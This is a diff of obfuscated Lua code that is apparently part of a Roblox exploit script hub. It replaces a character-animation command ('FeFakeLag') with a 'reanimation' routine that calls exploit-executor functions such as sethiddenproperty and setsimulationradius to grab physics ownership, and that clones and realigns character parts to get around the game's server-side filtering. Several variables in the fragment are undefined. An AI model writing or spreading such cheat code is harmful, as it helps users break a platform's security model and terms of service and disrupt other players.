-                if L_188_forvar1 and (L_188_forvar1 ~= "") then
-                        L_188_forvar1.C0 = L_42_(0, 0, 0)
-                        L_188_forvar1.C1 = L_42_(0, 0, 0)
-                else
-                        return
-                end
-        end
-        local L_78_ = L_47_func(L_46_, "HumanoidRootPart", "BasePart")
-        if not L_78_ then
-                return
-        end
-        local function L_79_func(L_189_arg0)
-                local L_190_, L_191_ = L_189_arg0.Part0, L_189_arg0.Part1
-                L_189_arg0.Part1, L_189_arg0.Part0 = L_190_, L_191_
-        end
-        L_79_func(L_77_["Left Shoulder"])
-        L_79_func(L_77_["Right Shoulder"])
-        L_79_func(L_77_["Left Hip"])
-        L_79_func(L_77_["Right Hip"])
-        for L_192_forvar0, L_193_forvar1 in pairs(L_46_:GetChildren()) do
-                if L_193_forvar1:IsA("Accessory") then
-                        L_193_forvar1:Destroy()
-                end
-        end
-        L_77_.Neck.C0 = L_42_(0, 0.3, - 0.5)
-        L_76_.Button1Down:Connect(function()
-                if not (kill or L_68_ or L_71_) then
-                        L_69_ = true
-                        L_67_ = false
-                        L_64_.WalkSpeed = 0
-                        wait(0.5)
-                        L_64_.WalkSpeed = 16
-                        L_69_ = false
-                end
-        end)
-        L_76_.KeyDown:Connect(function(L_194_arg0)
-                if not L_46_ then
-                        return
-                end
-                L_194_arg0 = L_194_arg0:lower()
-                if k == "e" then
-                        if not L_66_ then
-                                L_70_ = false
-                                L_68_ = false
-                                L_66_ = true
-                                L_67_ = true
-                                L_64_.WalkSpeed = 100
-                                position = "ventidle"
-                        elseif L_66_ then
-                                L_66_ = false
-                                L_67_ = false
-                                L_64_.WalkSpeed = 16
-                        end
-                elseif L_194_arg0 == "f" then
-                        if not L_70_ then
-                                L_66_ = false
-                                L_67_ = false
-                                L_70_ = true
-                                L_68_ = true
-                                L_73_ = false
-                                L_74_ = false
-                                L_64_.WalkSpeed = 60
-                        elseif L_70_ then
-                                L_70_ = false
-                                L_68_ = false
-                                L_64_.WalkSpeed = 16
-                        end
-                elseif L_194_arg0 == "q" then
-                        if L_72_ == false then
-                                L_66_ = false
-                                L_67_ = false
-                                L_70_ = false
-                                L_68_ = false
-                                L_72_ = true
-                                L_71_ = true
-                                L_73_ = false
-                                L_74_ = false
-                                L_64_.WalkSpeed = 0
-                        elseif L_72_ == true then
-                                L_72_ = false
-                                L_71_ = false
-                                L_64_.WalkSpeed = 16
-                        end
-                elseif L_194_arg0 == "c" then
-                        if L_73_ == false then
-                                L_66_ = false
-                                L_67_ = false
-                                L_70_ = false
-                                L_68_ = false
-                                L_72_ = false
-                                L_71_ = false
-                                L_73_ = true
-                                L_74_ = true
-                                L_64_.WalkSpeed = 0
-                        elseif L_73_ == true then
-                                L_73_ = false
-                                L_74_ = false
-                                L_64_.WalkSpeed = 16
-                        end
-                end
-        end)
-        local L_80_ = "idle"
-        while L_37_:Wait() and L_46_ do
-                if L_69_ then
-                        L_80_ = "attack"
-                elseif L_71_ then
-                        L_80_ = "dead"
-                elseif L_74_ then
-                        L_80_ = "sit"
-                elseif L_68_ then
-                        if L_78_.Velocity.Magnitude < 2 then
-                                L_80_ = "idle2"
-                        elseif L_78_.Velocity.Magnitude > 20 then
-                                L_80_ = "walk2"
-                        end
-                else
-                        if L_78_.Velocity.y > 1 then
-                                L_80_ = "jump"
-                        elseif L_78_.Velocity.y <-1 then
-                                L_80_ = "fall"
-                        elseif L_78_.Velocity.Magnitude < 2 then
-                                L_80_ = "idle"
-                        elseif L_78_.Velocity.Magnitude < 20 then
-                                L_80_ = "walk"
-                        elseif L_78_.Velocity.Magnitude > 20 then
-                                L_80_ = "run"
-                        end
-                end
-                L_75_ += 1
-                if L_80_ == "idle" then
-                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12), 0 + 0.3 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 2 + 0.3 * math.sin(L_75_ / 12), 0.3 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(L_75_ / 12)), math.rad(20 + 0 * math.sin(L_75_ / 12)), math.rad(-3 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 2 + 0.3 * math.sin(L_75_ / 12), 0.3 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(L_75_ / 12)), math.rad(-20 + 0 * math.sin(L_75_ / 12)), math.rad(3 + 0 * math.sin(L_75_ / 12))), 0.1)
-                elseif L_80_ == "walk" then
-                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12), 0 + 0.3 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(-10 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 2 + 0.3 * math.sin(L_75_ / 12), 0.3 + 0.3 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 30 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 2 + 0.3 * math.sin(L_75_ / 12), 0.3 + - 0.3 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 +-30 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                elseif L_80_ == "jump" then
-                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(15 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(10 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                elseif L_80_ == "fall" then
-                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(15 + 10 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(-10 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(10 + 5 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(10 + 0 * math.sin(L_75_ / 12))), 0.1)
-                elseif L_80_ == "vent" then
-                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12), 0 +-8 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 1.5 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 2 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                elseif L_80_ == "ventidle" then
-                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12),-20 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 1.5 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 2 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                elseif L_80_ == "idle2" then
-                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 20), 3 + 0.3 * math.sin(L_75_ / 20), 0 + 0 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(0 + 20 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20))), 0.1)
-                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 20), 1 + 0 * math.sin(L_75_ / 20), 1 + 0 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(20 +-20 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20))), 0.1)
-                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 20), 2 + 0 * math.sin(L_75_ / 20), 0.5 + - 0.5 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(10 +-20 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20))), 0.1)
-                elseif L_80_ == "walk2" then
-                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 20), 3 + 0.3 * math.sin(L_75_ / 20), 0 + 0 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(-60 + 10 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20))), 0.1)
-                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(L_75_ / 20), 2 + 0 * math.sin(L_75_ / 20), 0.3 + 0 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(0 +-10 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(-5 + 0 * math.sin(L_75_ / 20))), 0.1)
-                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 20), 1 + 0 * math.sin(L_75_ / 20), 0.5 + 0 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(0 +-20 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(5 + 0 * math.sin(L_75_ / 20))), 0.1)
-                elseif L_80_ == "attack" then
-                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 5), 0 + 0 * math.sin(L_75_ / 5), 0 + 0 * math.sin(L_75_ / 5)) * CFrame.Angles(math.rad(30 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5))), 0.1)
-                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(L_75_ / 12), 2 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(-4 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(L_75_ / 12), 2 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(4 + 0 * math.sin(L_75_ / 12))), 0.1)
-                elseif L_80_ == "sit" then
-                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 5), - 1.8 + 0 * math.sin(L_75_ / 5), 0 + 0 * math.sin(L_75_ / 5)) * CFrame.Angles(math.rad(10 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5))), 0.1)
-                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12),-1 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(L_75_ / 12)), math.rad(10 + 0 * math.sin(L_75_ / 12)), math.rad(-4 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12),-1 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(L_75_ / 12)), math.rad(-10 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                elseif L_80_ == "dead" then
-                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 5), - 2.5 + 0 * math.sin(L_75_ / 5),-1 + 0 * math.sin(L_75_ / 5)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5))), 0.1)
-                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(L_75_ / 12), 3 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(-4 + 0 * math.sin(L_75_ / 12))), 0.1)
-                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(L_75_ / 12), 3 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(4 + 0 * math.sin(L_75_ / 12))), 0.1)
-                end
-                L_77_["Right Shoulder"].C0 = L_77_["Right Shoulder"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12), - 0.8 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-                L_77_["Left Shoulder"].C0 = L_77_["Left Shoulder"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12), - 0.8 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
-        end
-end)L_2_:AddCommand('FeFakeLag', {}, 'Script not mine no hate plz FE FAKE LAG V2', function(L_195_arg0, L_196_arg1)
-    -- Creo Fake Lag Script
+local n = true --disable aligns for head and enable after neck is removed
+local o = game:GetService("Players").LocalPlayer
+local p = game:GetService("RunService")
+local q = p.Stepped
+local r = p.Heartbeat
+local p = p.RenderStepped
+local s = game:GetService("StarterGui")
+local t = game:GetService("Workspace")
+local u = CFrame.new
+local v = Vector3.new
+local w = v(0, 0, 0)
+local x = math.huge
+local y = o.Character
+if not (y and y.Parent) then
+    return
+end
+for a, a in pairs(y:GetDescendants()) do
+    if a:IsA("CharacterMesh") or a:IsA("SpecialMesh") then
+            a:Destroy()
+    end
+end
+y:GetPropertyChangedSignal("Parent"):Connect(function()
+    if not (y and y.Parent) then
+            y = nil
+    end
+end)
+local function z(a, b, c)
+    local d = nil
+    pcall(function()
+            for a, a in pairs(a:GetChildren()) do
+                    if (a.Name == b) and a:IsA(c) then
+                            d = a
+                            break
+                    end
+            end
+    end)
+    return d
+end
+local function A(b, d)
+    b.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0.0001, 0.0001, 0.0001, 0.0001)
+    local e = Instance.new("Attachment", b)
+    e.Orientation = w
+    e.Position = w
+    e.Name = "att0_" .. b.Name
+    local f = Instance.new("Attachment", d)
+    f.Orientation = w
+    f.Position = w
+    f.Name = "att1_" .. d.Name
+    if (m == 1) or (m == 2) then
+            local a = Instance.new("AlignPosition", e)
+            a.ApplyAtCenterOfMass = false
+            a.MaxForce = x
+            a.MaxVelocity = x
+            a.ReactionForceEnabled = false
+            a.Responsiveness = 200
+            a.Attachment1 = f
+            a.Attachment0 = e
+            a.Name = "AlignPositionRtrue"
+            a.RigidityEnabled = true
+    end
+    if (m == 2) or (m == 3) then
+            local a = Instance.new("AlignPosition", e)
+            a.ApplyAtCenterOfMass = false
+            a.MaxForce = x
+            a.MaxVelocity = x
+            a.ReactionForceEnabled = false
+            a.Responsiveness = 200
+            a.Attachment1 = f
+            a.Attachment0 = e
+            a.Name = "AlignPositionRfalse"
+            a.RigidityEnabled = false
+    end
+    local d = Instance.new("AlignOrientation", e)
+    d.MaxAngularVelocity = x
+    d.MaxTorque = x
+    d.PrimaryAxisOnly = false
+    d.ReactionTorqueEnabled = false
+    d.Responsiveness = 200
+    d.Attachment1 = f
+    d.Attachment0 = e
+    d.RigidityEnabled = false
+    if a then
+            b:GetPropertyChangedSignal("Parent"):Connect(function()
+                    if not (b and b.Parent) then
+                            b = nil
+                    end
+            end)
+            spawn(function()
+                    if typeof(a) == "Vector3" then
+                            local c = w
+                            local d = w
+                            while b do
+                                    b.Velocity = c
+                                    b.RotVelocity = d
+                                    r:Wait()
+                                    if b then
+                                            c = b.Velocity
+                                            b.Velocity = a
+                                            b.RotVelocity = w
+                                            q:Wait()
+                                    end
+                            end
+                    elseif typeof(a) == "number" then
+                            local d = w
+                            local e = w
+                            while b do
+                                    b.Velocity = d
+                                    b.RotVelocity = e
+                                    r:Wait()
+                                    if b then
+                                            local f = d
+                                            local g = f.Magnitude
+                                            if g < c then
+                                                    f = v(0, a, 0)
+                                            else
+                                                    local a = a / g
+                                                    f *= v(a, a, a)
+                                            end
+                                            d = b.Velocity
+                                            e = b.RotVelocity
+                                            b.Velocity = f
+                                            b.RotVelocity = w
+                                            q:Wait()
+                                    end
+                            end
+                    end
+            end)
+    end
+end
+local function a()
+    local a = o.Character
+    local b = t.CurrentCamera.CFrame
+    local c = Instance.new("Model")
+    local d = Instance.new("Humanoid", c)
+    o.Character = c
+    d.Health = 0
+    o.Character = a
+    c:Destroy()
+    local a = nil
+    local function c()
+            a:Disconnect()
+            t.CurrentCamera.CFrame = b
+    end
+    a = p:Connect(c)
+end
+local c = (l == 4) or (l == 5)
+local m = (l == 0) or (l == 4)
+local B = (l == 0) or (l == 2) or (l == 3)
+i = i and z(o, "Backpack", "Backpack")
+if d == "shp" then
+    local a = sethiddenproperty or set_hidden_property or set_hidden_prop or sethiddenprop
+    if a then
+            spawn(function()
+                    while y and r:Wait() do
+                            a(o, "SimulationRadius", x)
+                    end
+            end)
+    end
+elseif d == "ssr" then
+    local a = setsimulationradius or set_simulation_radius or set_sim_radius or setsimradius or set_simulation_rad or setsimulationrad
+    if a then
+            spawn(function()
+                    while y and r:Wait() do
+                            a(x)
+                    end
+            end)
+    end
+end
+e = e and function(a)
+    if a:IsA("HingeConstraint") or a:IsA("BallSocketConstraint") then
+            a.Parent = nil
+    end
+end
+if e then
+    for a, a in pairs(y:GetDescendants()) do
+            e(a)
+    end
+    y.DescendantAdded:Connect(e)
+end
+if B then
+    a()
+end
+if l == 0 then
+    wait(j)
+    if not y then
+            return
+    end
+end
+if g then
+    for a, a in pairs(y:GetChildren()) do
+            if a:IsA("LocalScript") then
+                    a.Disabled = true
+            end
+    end
+elseif f then
+    local a = z(y, "Animate", "LocalScript")
+    if a and (not a.Disabled) then
+            a.Disabled = true
+    else
+            f = false
+    end
+end
+local d = y:FindFirstChildOfClass("Humanoid")
+if d then
+    for a, a in pairs(d:GetPlayingAnimationTracks()) do
+            a:Stop()
+    end
+end
+if i then
+    for a, a in pairs(i:GetChildren()) do
+            if a:IsA("Tool") then
+                    a.Parent = y
+            end
+    end
+end
+pcall(function()
+    settings().Physics.AllowSleep = false
+    settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
+end)
+local d = {}
+for a, a in pairs(y:GetDescendants()) do
+    if a.ClassName == "Script" then
+            table.insert(d, a)
+    end
+end
+local e = {}
+for a, b in pairs(y:GetDescendants()) do
+    if b:IsA("BasePart") then
+            local a = tostring(a)
+            local c = true
+            while c do
+                    c = false
+                    for b, b in pairs(d) do
+                            if b.Name == a then
+                                    c = true
+                            end
+                    end
+                    if c then
+                            a = a .. "_"
+                    end
+            end
+            table.insert(e, a)
+            Instance.new("Script", b).Name = a
+    end
+end
+y.Archivable = true
+local d = y:Clone()
+for a, a in pairs(d:GetDescendants()) do
+    pcall(function()
+            a.Transparency = 1
+            a.Anchored = false
+    end)
+end
+local g = Instance.new("Model", y)
+g.Name = g.ClassName
+g:GetPropertyChangedSignal("Parent"):Connect(function()
+    if not (g and g.Parent) then
+            g = nil
+    end
+end)
+for a, a in pairs(y:GetChildren()) do
+    if a ~= g then
+            if c and a:IsA("Humanoid") then
+                    a:Destroy()
+            else
+                    if i and a:IsA("Tool") then
+                            for b, b in pairs(a:GetDescendants()) do
+                                    if b and b.Parent and b:IsA("BasePart") then
+                                            local b = Instance.new("BodyVelocity", b)
+                                            b.Velocity = w
+                                            b.MaxForce = v(1000, 1000, 1000)
+                                            b.P = 1250
+                                            b.Name = "bv_" .. a.Name
+                                    end
+                            end
+                    end
+                    a.Parent = g
+            end
+    end
+end
+local r = z(g, "Head", "BasePart")
+local w = z(g, "Torso", "BasePart") or z(g, "UpperTorso", "BasePart")
+if m then
+    g:BreakJoints()
+else
+    if r and w then
+            for a, a in pairs(g:GetDescendants()) do
+                    if a:IsA("Weld") or a:IsA("Snap") or a:IsA("Glue") or a:IsA("Motor") or a:IsA("Motor6D") then
+                            local b = false
+                            if (a.Part0 == w) and (a.Part1 == r) then
+                                    b = true
+                            end
+                            if (a.Part0 == r) and (a.Part1 == w) then
+                                    b = true
+                            end
+                            if b then
+                                    if n then
+                                            n = a
+                                    end
+                            else
+                                    a:Destroy()
+                            end
+                    end
+            end
+    end
+    if l == 3 then
+            spawn(function()
+                    wait(j)
+                    if g then
+                            g:BreakJoints()
+                    end
+            end)
+    end
+end
+d.Parent = y
+for a, a in pairs(d:GetChildren()) do
+    a.Parent = y
+end
+d:Destroy()
+local d = {}
+for a, b in pairs(g:GetDescendants()) do
+    if b:IsA("BasePart") then
+            a = tostring(a)
+            local c = nil
+            c = b:GetPropertyChangedSignal("Parent"):Connect(function()
+                    if not (b and b.Parent) then
+                            c:Disconnect()
+                            d[a] = nil
+                    end
+            end)
+            d[a] = b
+    end
+end
+local j = nil
+local function l()
+    if g then
+            for a, a in pairs(d) do
+                    a.CanCollide = false
+            end
+    else
+            j:Disconnect()
+    end
+end
+j = q:Connect(l)
+l()
+for a, a in pairs(g:GetDescendants()) do
+    if (a.ClassName == "Script") and table.find(e, a.Name) then
+            local b = a.Parent
+            if b:IsA("BasePart") then
+                    for c, c in pairs(y:GetDescendants()) do
+                            if (c.ClassName == "Script") and (c.Name == a.Name) and (not c:IsDescendantOf(g)) then
+                                    local a = c.Parent
+                                    if (a.ClassName == b.ClassName) and (a.Name == b.Name) then
+                                            A(b, a)
+                                            break
+                                    end
+                            end
+                    end
+            end
+    end
+end
+if (typeof(n) == "Instance") and r and r.Parent then
+    local a = {}
+    for b, b in pairs(r:GetDescendants()) do
+            if b:IsA("AlignPosition") or b:IsA("AlignOrientation") then
+                    table.insert(a, b)
+                    b.Enabled = false
+            end
+    end
+    spawn(function()
+            while y and n and n.Parent do
+                    q:Wait()
+            end
+            if not (y and r and r.Parent) then
+                    return
+            end
+            for a, a in pairs(a) do
+                    pcall(function()
+                            a.Enabled = true
+                    end)
+            end
+    end)
+end
+for a, a in pairs(y:GetDescendants()) do
+    if a and a.Parent then
+            if a.ClassName == "Script" then
+                    if table.find(e, a.Name) then
+                            a:Destroy()
+                    end
+            elseif not a:IsDescendantOf(g) then
+                    if a:IsA("Decal") then
+                            a.Transparency = 1
+                    elseif a:IsA("ForceField") then
+                            a.Visible = false
+                    elseif a:IsA("Sound") then
+                            a.Playing = false
+                    elseif a:IsA("BillboardGui") or a:IsA("SurfaceGui") or a:IsA("ParticleEmitter") or a:IsA("Fire") or a:IsA("Smoke") or a:IsA("Sparkles") then
+                            a.Enabled = false
+                    end
+            end
+    end
+end
+if f then
+    local a = z(y, "Animate", "LocalScript")
+    if a then
+            a.Disabled = false
+    end
+end
+if i then
+    for a, a in pairs(y:GetChildren()) do
+            if a:IsA("Tool") then
+                    a.Parent = i
+            end
+    end
+end
+local d = g:FindFirstChildOfClass("Humanoid")
+local e = y:FindFirstChildOfClass("Humanoid")
+if e then
+    t.CurrentCamera.CameraSubject = e
+    local a = nil
+    local function b()
+            a:Disconnect()
+            if y and e and (e.Parent == y) then
+                    t.CurrentCamera.CameraSubject = e
+            end
+    end
+    a = p:Connect(b)
+    if d then
+            d.Changed:Connect(function(a)
+                    if (a == "Jump") and e and e.Parent then
+                            e.Jump = d.Jump
+                    end
+            end)
+    else
+            o.Character = nil
+            o.Character = y
+    end
+end
+local f = Instance.new("BindableEvent", y)
+f.Event:Connect(function()
+    f:Destroy()
+    s:SetCore("ResetButtonCallback", true)
+    if c then
+            y:BreakJoints()
+            return
+    end
+    if B then
+            if d and d.Parent and (d.Health > 0) then
+                    g:BreakJoints()
+                    d.Health = 0
+            end
+            a()
+    else
+            if d and d.Parent and (d.Health > 0) then
+                    g:BreakJoints()
+                    d.Health = 0
+            end
+    end
+end)
